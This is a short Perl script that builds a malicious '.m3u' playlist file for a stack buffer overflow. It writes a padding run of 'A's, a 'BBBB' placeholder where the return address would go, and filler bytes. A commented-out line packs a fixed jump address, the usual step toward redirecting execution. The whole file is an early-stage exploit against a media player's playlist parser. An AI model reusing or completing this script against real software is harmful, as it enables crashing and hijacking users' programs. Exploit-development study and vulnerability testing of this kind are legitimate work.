$file= "stackpbl.m3u";

$buffer ="A" x 208;
#$buffer .= pack('V',0x7E429353);
$buffer .="BBBB";
$buffer .= "C" x 298;
$buffer .= "G"x 500;

open($FILE,">$file");
print $FILE $buffer;
close($FILE);
